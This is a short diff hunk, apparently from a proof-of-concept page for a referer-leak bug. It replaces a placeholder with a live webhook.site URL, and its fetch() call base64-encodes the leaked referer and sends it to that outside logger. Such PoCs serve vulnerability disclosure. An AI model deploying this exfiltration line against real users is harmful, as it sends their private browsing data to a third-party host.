@@ -11,7 +11,7 @@
         if (leakedReferer) {
             // Send the leak to a public logger (like Webhook.site) 
             // Replace 'YOUR_WEBHOOK_URL' with your actual Webhook.site link
-            fetch('https://webhook.site/YOUR_UNIQUE_ID?leak=' + btoa(leakedReferer));
+            fetch('https://webhook.site/931792bf-a7c1-411f-a965-87723d2148d4?leak=' + btoa(leakedReferer));
             
             document.write("<h1>PoC Triggered</h1><p>Referer logged successfully.</p>");
         } else {
